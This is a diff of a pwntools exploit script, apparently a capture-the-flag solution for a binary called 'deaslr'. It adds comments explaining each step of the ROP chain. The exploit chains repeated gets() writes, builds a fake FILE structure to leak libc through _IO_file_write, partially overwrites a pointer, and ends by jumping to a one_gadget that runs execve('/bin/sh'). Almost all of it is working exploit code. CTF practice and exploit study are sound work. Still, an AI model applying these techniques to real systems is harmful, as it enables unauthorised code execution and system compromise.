@@ -31,7 +31,7 @@ exe = ELF("deaslr_patched", checksec=False)
 libc = ELF("./libc.so.6", checksec=False)
 ld = ELF("./ld-2.23.so", checksec=False)
 
-context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
+context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
 context.binary = exe
 
 gdbscript = '''
@@ -98,7 +98,7 @@ while True:
     pl = flat(
         stack_2, # saved rbp
         exe.symbols['main'], # 3rd write
-        leave_ret, # rsp -> stack 2, rbp...
+        leave_ret, # rsp -> stack 2, rbp -> stdin_addr - 0x20
     )
 
     # Padding
@@ -120,11 +120,11 @@ while True:
         stack_1,
         exe.symbols['gets'], # 6th write
 
-        leave_ret
+        leave_ret, # rsp -> stdin_addr - 0x20
     )
 
     # Fake FILE structure
-    # __fileno = 1, __flags2 = 2
+    # __fileno = 1, __flags2 = 2 (write syscall can't be canceled)
     pl += flat(z(0x70), 1, 2)
 
     sl(p, pl)
@@ -145,24 +145,28 @@ while True:
         100, # r13 -> rdx
         exe.got['gets'], # r14 -> rsi
         fake_file, # r15 -> rdi
-        call
+        call # _IO_file_write
     )
     sl(p, pl)
 
     print("5th write -> ROP above STDIN address")
+    '''
+    tele 0x70dc813c0000+0x4eb*8
+    0x70dc813c2758 (__GI__IO_file_jumps+120) —▸ 0x70dc81078b70 (_IO_file_write@@GLIBC_2.2.5)
+    '''
     pl = flat(
         pop_rbx_rbp_r12_r13_r14_r15_ret,
         0x4eb, # rbx
-        0x4ec, # rbp = rbx + 1
-        b'\0', # Overwrite last byte
+        0x4ec, # rbp = rbx + 1, to return
+        b'\0', # Overwrite last byte -> _nl_C_LC_TIME+160
     )
     sl(p, pl)
 
-    print("6th write -> ")
+    print("6th write -> to have another gets() after leaking libc")
     pl = flat(
         pop_rdi_ret,
         stack_1 + 0x18,
-        exe.plt['gets']
+        exe.plt['gets'] # 7th write
     )
     sl(p, pl)
 
@@ -175,11 +179,18 @@ while True:
         print("Failed attempt")
         p.close()
         continue
-
-    print("execve")
+    
+    '''
+    0x4526a execve("/bin/sh", rsp+0x30, environ)
+    constraints:
+    [rsp+0x30] == NULL
+    '''
+    one_gadget = libc.address + 0x4526a
+    lg("one gadget", one_gadget)
+    print("7th write -> one_gadget")
     pl = flat(
-        libc.address + 0x4526a,
-        p64(0) * 8
+        one_gadget,
+        p64(0) * 5
     )
     sl(p, pl)
 
